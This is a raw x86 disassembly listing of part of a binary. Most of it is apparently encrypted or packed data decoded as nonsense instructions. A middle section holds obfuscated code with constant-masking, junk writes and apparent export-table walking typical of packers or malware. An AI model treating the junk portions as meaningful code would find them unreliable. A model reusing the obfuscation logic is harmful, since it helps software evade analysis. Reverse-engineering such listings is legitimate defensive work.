  4062fe:	fidivr WORD PTR [ebx+ebp*1]
  406301:	push   es
  406302:	fcomi  st,st(0)
  406304:	(bad)  
  406305:	leave  
  406306:	jmp    0x406324
  406308:	rcr    ah,0xdb
  40630b:	ins    BYTE PTR es:[edi],dx
  40630c:	and    edi,DWORD PTR [ebx+0x1b1ce9bf]
  406312:	fwait
  406313:	cmp    al,0xa3
  406315:	popa   
  406316:	xor    DWORD PTR [edi],ebx
  406318:	fsubrp st(2),st
  40631a:	dec    eax
  40631b:	pushf  
  40631c:	test   al,0x14
  40631e:	jmp    0x9eace752
  406323:	or     eax,0x7b6620ab
  406328:	adc    al,0xa9
  40632a:	adc    eax,0x190cb74f
  40632f:	add    BYTE PTR [edx],bl
  406331:	loop   0x4063b0
  406333:	rcl    edx,1
  406335:	xor    BYTE PTR [ecx+eiz*2],0x1e
  406339:	in     al,dx
  40633a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40633b:	jb     0x406316
  40633d:	sahf   
  40633e:	in     eax,0x4e
  406340:	pop    es
  406341:	mov    eax,0x333bca55
  406347:	pusha  
  406348:	inc    eax
  406349:	es jmp 0x40632f
  40634c:	sub    al,0x67
  40634e:	and    esi,edx
  406350:	shl    DWORD PTR [ecx-0x30],1
  406353:	mov    ss,WORD PTR [ecx-0x17]
  406356:	scas   eax,DWORD PTR es:[edi]
  406357:	shufps xmm0,XMMWORD PTR [edi+0x7f],0x71
  40635c:	pop    esp
  40635d:	fcmovbe st,st(0)
  40635f:	fidivr DWORD PTR [edx+0x6d]
  406362:	inc    dh
  406364:	sbb    eax,0xae76a1d
  406369:	imul   ebp,ebp,0x35bc1b72
  40636f:	test   ecx,esi
  406371:	cwde   
  406372:	in     eax,dx
  406373:	or     al,0x5c
  406375:	mov    dh,0x0
  406377:	sub    DWORD PTR [esi],edi
  406379:	loop   0x4063f0
  40637b:	adc    bh,BYTE PTR [edx+0x35]
  40637e:	jle    0x406333
  406380:	inc    esp
  406381:	pop    edx
  406382:	cwde   
  406383:	(bad)  
  406384:	push   cs
  406385:	(bad)  
  406386:	ffree  st(6)
  406388:	add    ah,ah
  40638a:	loop   0x4063f6
  40638c:	popf   
  40638d:	leave  
  40638e:	js     0x4063c4
  406390:	jbe    0x4063f0
  406392:	mov    ch,0xb9
  406394:	sti    
  406395:	inc    edi
  406396:	push   cs
  406397:	fdivr  QWORD PTR [edx+0x42]
  40639a:	pop    edx
  40639b:	test   eax,0x94ad01c7
  4063a0:	(bad)  
  4063a1:	fcmove st,st(0)
  4063a3:	push   ecx
  4063a4:	pushf  
  4063a5:	sar    BYTE PTR [edi-0x3c],0x3
  4063a9:	jne    0x406419
  4063ab:	xor    edi,edi
  4063ad:	sti    
  4063ae:	std    
  4063af:	data16 arpl WORD PTR [edx],di
  4063b2:	add    al,0x0
  4063b4:	inc    esp
  4063b5:	js     0x4063e6
  4063b7:	mov    dl,0xd0
  4063b9:	pusha  
  4063ba:	(bad)  
  4063bb:	icebp  
  4063bc:	mov    ds:0x9d9da05d,eax
  4063c1:	pop    ebp
  4063c2:	cmp    BYTE PTR [ecx+0x79],ch
  4063c5:	out    dx,eax
  4063c6:	pop    eax
  4063c7:	xor    BYTE PTR [edi+0x73],cl
  4063ca:	mov    ebx,0x86a92639
  4063cf:	mov    ch,0x79
  4063d1:	call   0x592d7382
  4063d6:	in     eax,0xa9
  4063d8:	je     0x406413
  4063da:	out    0xe6,eax
  4063dc:	push   ebx
  4063dd:	push   esp
  4063de:	mov    ds:0xba9a2d79,eax
  4063e3:	push   ebx
  4063e4:	or     BYTE PTR cs:[ebx+0x32],al
  4063e8:	cs inc edx
  4063ea:	sbb    bl,BYTE PTR ds:0x3f0ec10e
  4063f0:	lods   al,BYTE PTR ds:[esi]
  4063f1:	lea    ecx,[edx+0xb]
  4063f4:	fst    QWORD PTR [ecx+0x78]
  4063f7:	sub    DWORD PTR [edx],ebx
  4063f9:	(bad)  
  4063fa:	pop    esp
  4063fb:	pop    eax
  4063fc:	call   FWORD PTR [ebp-0x2]
  4063ff:	adc    al,0xde
  406401:	aad    0x96
  406403:	(bad)  
  406404:	shl    BYTE PTR [eax],cl
  406406:	pop    edi
  406407:	dec    eax
  406408:	outs   dx,DWORD PTR ds:[esi]
  406409:	mov    al,ds:0x77bf905a
  40640e:	add    ah,al
  406410:	clc    
  406411:	(bad)
  406414:	pop    ebx
  406415:	lds    edi,FWORD PTR [edi]
  406417:	addr16 dec edi
  406419:	shl    ebx,1
  40641b:	or     eax,0xbc735de2
  406420:	jecxz  0x40646e
  406422:	push   0x61
  406424:	adc    ch,cl
  406426:	sahf   
  406427:	gs js  0x406456
  40642a:	push   cs
  40642b:	pop    eax
  40642c:	push   edx
  40642d:	mov    ah,bl
  40642f:	add    BYTE PTR [ecx+0x10],dh
  406432:	jb     0x4064a2
  406434:	adc    DWORD PTR [edx-0x4f],eax
  406437:	add    DWORD PTR [edx+eiz*2+0x28],0xb284303d
  40643f:	lea    edi,[edx]
  406441:	vunpcklpd ymm6,ymm6,YMMWORD PTR [esp+ecx*8]
  406446:	add    bl,BYTE PTR [edx+0x6e]
  406449:	jmp    0x587b:0x6f03784c
  406450:	retf   0x41a5
  406453:	jp     0x40646e
  406455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406456:	(bad)  ds:0x34cc4600
  40645c:	cld    
  40645d:	mov    edx,gs
  40645f:	push   edx
  406460:	cmp    eax,DWORD PTR [ecx]
  406462:	(bad)
  406466:	fimul  DWORD PTR [edx-0x7d3d01dc]
  40646c:	lahf   
  40646d:	mov    ds:0x5e18fb47,eax
  406472:	inc    ebp
  406473:	cmp    al,0x8b
  406475:	xchg   DWORD PTR [ecx-0x1c],edi
  406478:	xlat   BYTE PTR ds:[ebx]
  406479:	mov    ds:0xadf86a4,al
  40647e:	cli    
  40647f:	mov    edx,0xc355b35e
  406484:	test   BYTE PTR [ecx-0x35880b38],bl
  40648a:	mov    ds:0xf2e0748e,al
  40648f:	push   esi
  406490:	nop
  406491:	sbb    esi,DWORD PTR cs:[esi+0x1a6a2992]
  406498:	or     dh,al
  40649a:	dec    eax
  40649b:	sbb    esp,edi
  40649d:	dec    ebx
  40649e:	sub    eax,0xa42140b6
  4064a3:	ss cmp ecx,edx
  4064a6:	mov    al,BYTE PTR [edx]
  4064a8:	outs   dx,DWORD PTR ds:[esi]
  4064a9:	cmp    BYTE PTR [ebx],bh
  4064ab:	cmp    al,0xb4
  4064ad:	jp     0x406527
  4064af:	pusha  
  4064b0:	sbb    eax,0x762ba582
  4064b5:	test   eax,0x84f840fd
  4064bb:	fstp   DWORD PTR [esi+0x649d9cd1]
  4064c1:	ds loopne 0x406532
  4064c4:	pop    ebp
  4064c5:	addr16 pop edx
  4064c7:	stc    
  4064c8:	mov    ch,0x4b
  4064ca:	add    BYTE PTR [ebx+0x1d5433f7],cl
  4064d0:	dec    DWORD PTR [ecx+0x21]
  4064d3:	adc    edx,edx
  4064d5:	jmp    0x75a54a39
  4064da:	test   BYTE PTR ds:0x9c14f5b6,ch
  4064e0:	mov    bh,dh
  4064e2:	in     al,dx
  4064e3:	mov    ebx,0x1e6b9b31
  4064e8:	popa   
  4064e9:	call   0x27a468ab
  4064ee:	mov    BYTE PTR [ecx-0x7],ah
  4064f1:	ret    
  4064f2:	je     0x406552
  4064f4:	cmp    cl,ch
  4064f6:	adc    eax,0xf29ee8de
  4064fb:	jle    0x406543
  4064fd:	or     bl,BYTE PTR [ebx-0x72]
  406500:	xor    DWORD PTR [ecx],esi
  406502:	jno    0x4064df
  406504:	seto   BYTE PTR [ebp-0x6665dda3]
  40650b:	and    DWORD PTR [ebp+0x5e],0x3e
  40650f:	jle    0x4064c3
  406511:	repnz or ch,BYTE PTR [edx-0x59]
  406515:	scas   eax,DWORD PTR es:[edi]
  406516:	push   ss
  406517:	mov    ebx,0x96cba019
  40651c:	sub    edi,DWORD PTR [ecx]
  40651e:	test   al,0x74
  406520:	fistp  DWORD PTR [ecx-0x7740fcaf]
  406526:	out    0x63,al
  406528:	sub    edi,esp
  40652a:	and    esp,DWORD PTR [esi]
  40652c:	mov    fs,esp
  40652e:	pop    edi
  40652f:	sub    BYTE PTR [ebx],bh
  406531:	ds aam 0x59
  406534:	cmp    cl,BYTE PTR [ecx-0x70b1dc43]
  40653a:	fadd   DWORD PTR [ecx+ecx*1+0x37]
  40653e:	xchg   ebp,eax
  40653f:	test   DWORD PTR [eax],0x101bab07
  406545:	cs xchg ebx,eax
  406547:	cld    
  406548:	fisubr DWORD PTR ds:[edx+edi*4]
  40654c:	or     DWORD PTR [ecx-0x235620d9],ebp
  406552:	xor    ch,BYTE PTR [edi+0x4eb347d4]
  406558:	fs xchg ebx,eax
  40655a:	xor    bl,BYTE PTR [edx]
  40655c:	sbb    BYTE PTR [ecx+0x23],cl
  40655f:	add    eax,DWORD PTR [ebx+0x13c7f683]
  406565:	ss in  al,dx
  406567:	sub    dl,al
  406569:	ins    DWORD PTR es:[edi],dx
  40656a:	mov    ah,0x72
  40656c:	pop    ss
  40656d:	mov    eax,ds:0xdb158807
  406572:	test   al,0xd2
  406574:	mov    bl,BYTE PTR [ecx-0x1a]
  406577:	sub    ebp,DWORD PTR [edx]
  406579:	fadd   QWORD PTR ds:0x1a486a20
  40657f:	pop    esp
  406580:	mov    esi,0x93f71b5c
  406585:	adc    eax,0x81f758de
  40658a:	sar    DWORD PTR [esi],1
  40658c:	cmp    ecx,DWORD PTR [edi+0x6bc82be7]
  406592:	(bad)  
  406593:	js     0x4065af
  406595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406596:	daa    
  406597:	ins    BYTE PTR es:[edi],dx
  406598:	cmp    bl,BYTE PTR [edi+edx*1-0x37331a02]
  40659f:	xlat   BYTE PTR ds:[ebx]
  4065a0:	jecxz  0x40653b
  4065a2:	gs sbb eax,0x3480ee17
  4065a8:	arpl   WORD PTR [ecx+ebx*8-0x65],si
  4065ac:	dec    edx
  4065ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065ae:	fwait
  4065af:	stc    
  4065b0:	cwde   
  4065b1:	in     al,0x76
  4065b3:	ret    
  4065b4:	leave  
  4065b5:	sub    BYTE PTR [ebx+0x20],ah
  4065b8:	mov    ecx,0x42a94623
  4065bd:	or     DWORD PTR [ebx-0x2b6a6898],edi
  4065c3:	mov    edx,0xd7a1aeca
  4065c8:	and    cl,BYTE PTR [edx-0x54]
  4065cb:	cmc    
  4065cc:	adc    ebx,DWORD PTR [edi+0x4e1094b8]
  4065d2:	xchg   esi,eax
  4065d3:	rcr    BYTE PTR [edx-0x30],1
  4065d6:	cs mov ecx,ebx
  4065d9:	loope  0x4065f1
  4065db:	and    al,0x3c
  4065dd:	push   esi
  4065de:	xor    eax,0x471b58e3
  4065e3:	cmp    BYTE PTR [ecx-0x1c4e2ba1],cl
  4065e9:	lea    edx,[esi-0x3272db]
  4065ef:	sbb    DWORD PTR ds:0x426000,0x42900c
  4065f9:	xor    ecx,ebx
  4065fb:	xor    DWORD PTR ds:0x425008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x427008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x425000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x427000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41d20c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x42900c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x428018,0x10
  406662:	cmp    DWORD PTR ds:0x428018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x428018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x421004
  406685:	cmp    DWORD PTR ds:0x428018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x428018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x428018,edi
  40669f:	mov    edi,DWORD PTR ds:0x428018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x428018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x42003f
  4066b7:	mov    edi,DWORD PTR ds:0x41d1d4
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x425008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x426000,0x426010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x42601c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x425018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x425018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x425018,ecx
  40671e:	cmp    DWORD PTR ds:0x425018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x425018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x421048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x42900c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x425000,0x426004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x42900c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42501c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42500c
  406785:	or     DWORD PTR ds:0x428014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x427000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x425004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x428004
  4067bc:	sbb    eax,DWORD PTR ds:0x42801c
  4067c2:	mov    ds:0x428004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x429008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x427018,0x427008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x428010
  4067f6:	add    ecx,DWORD PTR ds:0x42700c
  4067fc:	mov    DWORD PTR ds:0x428010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x425004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x425020,0x42901c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x425000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42500c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x42600c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx+0x26],0xfa
  4069c2:	sbb    bl,ah
  4069c4:	ret    0x623c
  4069c7:	bound  ebp,QWORD PTR [edx]
  4069c9:	pop    edi
  4069ca:	bound  esp,QWORD PTR [edx-0x4]
  4069cd:	inc    edx
  4069ce:	imul   ebx,DWORD PTR [ebx+edi*8+0x4b],0x270ebe16
  4069d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069d7:	fsub   DWORD PTR [eax]
  4069d9:	jae    0x406a3b
  4069db:	pop    ss
  4069dc:	or     eax,0x3d03f4e9
  4069e1:	shr    ah,cl
  4069e3:	cdq    
  4069e4:	mov    dl,0xd4
  4069e6:	fs xchg ebp,eax
  4069e8:	add    BYTE PTR [ecx+0x7438d0a7],dl
  4069ee:	daa    
  4069ef:	dec    ebx
  4069f0:	(bad)  
  4069f1:	push   esp
  4069f2:	cmp    DWORD PTR [eax],esi
  4069f4:	lods   al,BYTE PTR ds:[esi]
  4069f5:	sub    DWORD PTR [ebp+0x3a48d400],esp
  4069fb:	fist   DWORD PTR [ebx+ebx*2+0x5]
  4069ff:	or     DWORD PTR [ebx-0x5fb8af42],0xcca21ccb
  406a09:	clc    
  406a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a0c:	mov    ebp,0xec969b02
  406a11:	rol    ebx,cl
  406a13:	(bad)  
  406a14:	pop    eax
  406a15:	call   0x67448866
  406a1a:	adc    eax,0x907398b0
  406a1f:	jle    0x406a44
  406a21:	push   ecx
  406a22:	lahf   
  406a23:	xchg   edx,eax
  406a24:	ficomp DWORD PTR [esi+0x1a]
  406a27:	mov    ch,0xd5
  406a29:	jno    0x406aaa
  406a2b:	out    0xf3,al
  406a2d:	pop    eax
  406a2e:	fnstenv [esi+0x65]
  406a31:	pop    ecx
  406a32:	inc    ebx
  406a33:	push   ebp
  406a34:	inc    ebx
  406a35:	pop    ss
  406a36:	mov    esi,0xbaa67574
  406a3b:	cmp    BYTE PTR ds:0x9bc61f62,ch
  406a41:	add    al,0x88
  406a43:	clc    
  406a44:	push   ecx
  406a45:	aad    0x1
  406a47:	add    eax,0xef1db1b4
  406a4c:	fisttp QWORD PTR [ebp+0x42]
  406a4f:	pop    ecx
  406a51:	retf   
  406a52:	cmp    DWORD PTR [ecx-0x4bde6376],edx
  406a58:	lahf   
  406a59:	mov    bl,0x93
  406a5b:	mul    BYTE PTR [edi]
  406a5d:	retf   
  406a5e:	inc    eax
  406a5f:	(bad)  
  406a60:	fsubrp st(2),st
  406a62:	mov    ebx,0x7deb3108
  406a67:	scas   al,BYTE PTR es:[edi]
  406a68:	dec    ebp
  406a69:	xchg   ebx,eax
  406a6a:	int3   
  406a6b:	push   ebp
  406a6c:	punpcklbw mm5,mm3
  406a6f:	sub    eax,0xf52900d1
  406a74:	or     DWORD PTR [ecx],ebp
  406a76:	mov    ds:0x6c451688,eax
  406a7b:	cmp    BYTE PTR [edx-0x32],0x3f
  406a7f:	fwait
  406a80:	shr    ebx,0x28
  406a83:	dec    ecx
  406a84:	and    eax,0x6e408231
  406a89:	in     eax,dx
  406a8a:	leave  
  406a8b:	lods   eax,DWORD PTR ds:[esi]
  406a8c:	pop    edi
  406a8d:	aad    0xe6
  406a8f:	or     DWORD PTR [ebx-0x10],eax
  406a92:	mov    ecx,0x7b972cbc
  406a97:	jnp    0x406adb
  406a99:	mov    esi,fs
  406a9b:	rol    DWORD PTR [edi+0x30],0x70
  406a9f:	mov    DWORD PTR [edx+0x78],edx
  406aa2:	mov    ?,WORD PTR [ecx-0x5b]
  406aa5:	jns    0x406a76
  406aa7:	fistp  WORD PTR [eax+0x2b669a1a]
  406aad:	adc    cl,0x55
  406ab0:	jl     0x406aee
  406ab2:	mov    ebp,0x9366c832
  406ab7:	stos   BYTE PTR es:[edi],al
  406ab8:	adc    eax,0x2f956c94
  406abd:	add    al,0x7b
  406abf:	pop    eax
  406ac0:	loop   0x406a9d
  406ac2:	jns    0x406adb
  406ac4:	ret    0x8191
  406ac7:	xchg   esi,eax
  406ac8:	in     eax,0xd8
  406aca:	dec    ebp
  406acb:	div    si
  406ace:	inc    esp
  406acf:	add    esi,ebp
  406ad1:	push   esi
  406ad2:	out    0x52,eax
  406ad4:	cmp    eax,0x350c5202
  406ad9:	jmp    0x2f61:0xd2e93a57
  406ae0:	imul   edi,edx,0x16567970
  406ae6:	sub    eax,0x23c4f641
  406aeb:	dec    ebp
  406aec:	xor    ecx,ebx
  406aee:	or     bl,ah
  406af0:	pop    ebp
  406af1:	jae    0x406ab2
  406af3:	jnp    0x406b51
  406af5:	popa   
  406af6:	in     al,dx
  406af7:	pop    ecx
  406af8:	sbb    ch,BYTE PTR [edx+0x27]
  406afb:	xchg   DWORD PTR [ebp+0x4c],edx
  406afe:	xor    DWORD PTR [edx+edx*1-0x5b],eax
  406b02:	add    DWORD PTR [ebx+0x4375a93f],edx
  406b08:	sub    BYTE PTR [edx+0x2598d625],cl
  406b0e:	fnstenv ds:0x307baef3
  406b14:	bnd jnp 0x406aa9
  406b17:	mov    ss,WORD PTR [ebx]
  406b19:	stc    
  406b1a:	gs pop ds
  406b1c:	push   ebp
  406b1d:	iret   
  406b1e:	pop    edi
  406b1f:	test   al,0xe1
  406b21:	nop
  406b22:	stc    
  406b23:	or     al,0x22
  406b25:	xchg   esp,eax
  406b26:	pop    ds
  406b27:	maskmovq mm3,(bad)
  406b28:	neg    DWORD PTR [ecx+0x8]
  406b2b:	ret    
  406b2c:	adc    eax,ecx
  406b2e:	inc    esi
  406b2f:	sub    esp,ebx
  406b31:	js     0x406acc
  406b33:	cmp    esp,ebp
  406b35:	pop    ecx
  406b36:	retf   
  406b37:	retf   
  406b38:	mov    ah,0xd4
  406b3a:	mov    WORD PTR [eax],?
  406b3c:	push   ds
  406b3d:	psraw  mm3,QWORD PTR [ecx]
  406b40:	jmp    0xec31609
  406b45:	xor    eax,0xfec10848
  406b4a:	jmp    0x406b1a
  406b4c:	xchg   ecx,eax
  406b4d:	dec    edi
  406b4e:	dec    edx
  406b4f:	les    edx,FWORD PTR [ebp-0x19]
  406b52:	mov    cs,WORD PTR [ebx+0x758bedd8]
  406b58:	dec    eax
  406b59:	sbb    eax,DWORD PTR [esi]
  406b5b:	data16 aam 0x93
  406b5e:	xor    DWORD PTR [ebp+0x36],esi
  406b61:	lahf   
  406b62:	js     0x406b0c
  406b64:	push   ss
  406b65:	test   eax,0x7fb414cb
  406b6a:	mov    ds:0xb4ee6e0b,eax
  406b6f:	js     0x406b5a
  406b71:	inc    ebp
  406b72:	icebp  
  406b73:	cwde   
  406b74:	stos   BYTE PTR es:[edi],al
  406b75:	dec    esi
  406b76:	mov    al,0x23
  406b78:	jns    0x406b1f
  406b7a:	and    esp,ebx
  406b7c:	loop   0x406ba5
  406b7e:	mov    DWORD PTR [esi-0x29],ebx
  406b81:	mov    dl,bh
  406b83:	ds mov esp,0xe0173c74
  406b89:	(bad)  
  406b8a:	and    BYTE PTR [esp+ebx*1+0x5045be71],bh
  406b91:	dec    eax
  406b92:	in     al,0x82
  406b94:	pusha  
  406b95:	out    0x26,eax
  406b97:	into   
  406b98:	lods   eax,DWORD PTR ds:[esi]
  406b99:	pop    edi
  406b9a:	loope  0x406b1e
  406b9c:	mov    esi,0xba6ef9ab
  406ba1:	mov    ebp,DWORD PTR [edi-0x58]
  406ba4:	jle    0x406c11
  406ba6:	cmp    al,0xa
  406ba8:	scas   al,BYTE PTR es:[edi]
  406ba9:	add    eax,0xb35a4cff
  406bae:	or     dh,BYTE PTR [ecx+edi*4-0x26]
  406bb2:	dec    ecx
  406bb3:	sub    eax,0xc42031f0
  406bb8:	fcom   DWORD PTR [ecx-0x167d2080]
